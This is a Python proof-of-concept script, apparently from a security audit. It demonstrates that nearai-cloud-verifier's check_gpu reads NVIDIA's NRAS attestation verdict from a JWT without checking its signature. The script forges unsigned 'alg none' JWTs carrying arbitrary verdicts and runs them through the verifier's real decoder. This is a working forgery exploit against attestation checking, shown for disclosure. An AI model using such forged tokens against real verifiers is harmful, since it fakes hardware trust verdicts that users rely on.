#!/usr/bin/env python3
"""
Demonstrate Finding N-1: nearai-cloud-verifier's `check_gpu` reads
the NVIDIA NRAS verdict out of a JWT *without* verifying the JWT's
signature.

The relevant code in `py/model_verifier.py`:

    def base64url_decode_jwt_payload(jwt_token):
        payload_b64 = jwt_token.split(".")[1]
        padded = payload_b64 + "=" * ((4 - len(payload_b64) % 4) % 4)
        return base64.urlsafe_b64decode(padded).decode()

    def check_gpu(attestation, request_nonce):
        payload = json.loads(attestation["nvidia_payload"])
        ...
        body = fetch_nvidia_verification(payload)
        jwt_token = body[0][1]
        verdict = json.loads(base64url_decode_jwt_payload(jwt_token))["x-nvidia-overall-att-result"]
        ...

The function decodes only the middle (payload) segment of the JWT.
The header and signature are never verified against NVIDIA's
JWKS. This demo constructs a JWT whose signature is the empty
string and shows that the verifier's decoding logic accepts it and
reads any verdict the attacker wants.

We import the relevant function from the real
nearai-cloud-verifier source (so the demo exercises the exact
function call the verifier uses) but do not modify that source.

Reference: Finding N-1 in ../nearai_cloud_verifier_soundness_finding.md
"""

import argparse
import base64
import json
import os
import sys


DEFAULT_NEARAI_SRC = os.path.join(os.path.dirname(os.path.abspath(__file__)), "..", "nearai-cloud-verifier")


def _import_jwt_decoder(nearai_src: str):
    """Import `base64url_decode_jwt_payload` from the real verifier."""
    if nearai_src not in sys.path:
        sys.path.insert(0, os.path.join(nearai_src, "py"))
    # model_verifier.py imports dcap_qvl at top level; that package may
    # not be available on this host. We patch sys.modules so the import
    # succeeds and we can pull the one function we care about.
    import types as _types
    if "dcap_qvl" not in sys.modules:
        stub = _types.ModuleType("dcap_qvl")
        async def _stub(*a, **k):
            raise RuntimeError("dcap_qvl stubbed out for this demo")
        stub.get_collateral_and_verify = _stub
        sys.modules["dcap_qvl"] = stub
    if "requests" not in sys.modules:
        # model_verifier imports `requests`; if it's not installed,
        # provide a stub that raises if anyone tries to call it.
        try:
            import requests  # noqa: F401
        except ImportError:
            stub = _types.ModuleType("requests")
            def _no(*a, **k): raise RuntimeError("requests stubbed out")
            stub.get = _no
            stub.post = _no
            stub.head = _no
            sys.modules["requests"] = stub
    import model_verifier  # noqa: WPS433
    return model_verifier.base64url_decode_jwt_payload


def _craft_forged_jwt(payload: dict, header_alg: str = "none",
                       signature_bytes: bytes = b"") -> str:
    """Build a JWT-shaped string with arbitrary payload and (typically
    empty or garbage) signature segment."""
    header_b64 = base64.urlsafe_b64encode(
        json.dumps({"alg": header_alg}).encode()
    ).decode().rstrip("=")
    payload_b64 = base64.urlsafe_b64encode(
        json.dumps(payload).encode()
    ).decode().rstrip("=")
    sig_b64 = base64.urlsafe_b64encode(signature_bytes).decode().rstrip("=")
    return f"{header_b64}.{payload_b64}.{sig_b64}"


def main() -> int:
    parser = argparse.ArgumentParser(description=__doc__)
    parser.add_argument("--nearai-src", default=DEFAULT_NEARAI_SRC)
    args = parser.parse_args()

    if not os.path.isdir(args.nearai_src):
        print(f"error: --nearai-src not found: {args.nearai_src}", file=sys.stderr)
        return 1

    decoder = _import_jwt_decoder(args.nearai_src)
    print(f"[+] Loaded decoder: {decoder.__module__}.{decoder.__name__}")
    print()

    # Forge a JWT that claims "MATCH" with an empty signature.
    forged_payload = {
        "x-nvidia-overall-att-result": "MATCH",
        "x-nvidia-attestation-detailed-result": {"x-nvidia-gpu-arch-check": "MATCH"},
        "x-nvidia-iat": 1700000000,
        "nonce": "deadbeef" * 8,
    }
    forged_jwt = _craft_forged_jwt(forged_payload, header_alg="none", signature_bytes=b"")

    print("[+] Forged JWT (empty signature segment):")
    print(f"    {forged_jwt}")
    print()
    print(f"    Length: {len(forged_jwt)} chars")
    print(f"    Signature segment: '{forged_jwt.rsplit('.', 1)[-1]}' "
          f"({len(forged_jwt.rsplit('.', 1)[-1])} chars — empty!)")
    print()

    # Run the verifier's actual decoder on it.
    decoded = decoder(forged_jwt)
    print(f"[+] decoder returned (raw): {decoded!r}")
    parsed = json.loads(decoded)
    print(f"[+] decoder JSON-decoded:   {json.dumps(parsed, indent=2)}")
    print()

    verdict = parsed["x-nvidia-overall-att-result"]
    print(f"[+] Verdict the verifier would print: {verdict!r}")
    print()

    # Now show the attacker can pick any verdict.
    for v in ("MATCH", "PARTIAL_MATCH", "anything-we-want"):
        forged = _craft_forged_jwt(
            {"x-nvidia-overall-att-result": v}, signature_bytes=b""
        )
        parsed = json.loads(decoder(forged))
        print(f"    forged verdict '{v}'   -> decoder reads -> {parsed['x-nvidia-overall-att-result']!r}")

    print()
    print("[+] ATTACK CONFIRMED (P13, F4 — NRAS JWT signature unverified)")
    print("    `base64url_decode_jwt_payload` reads the payload segment and")
    print("    accepts arbitrary content. The header.alg and signature segments")
    print("    are never checked against NVIDIA's JWKS, so an attacker who")
    print("    controls the response from NRAS (or who MITMs the call) can")
    print("    return any verdict the verifier will print as `NVIDIA")
    print("    attestation verdict:`.")
    return 0


if __name__ == "__main__":
    raise SystemExit(main())
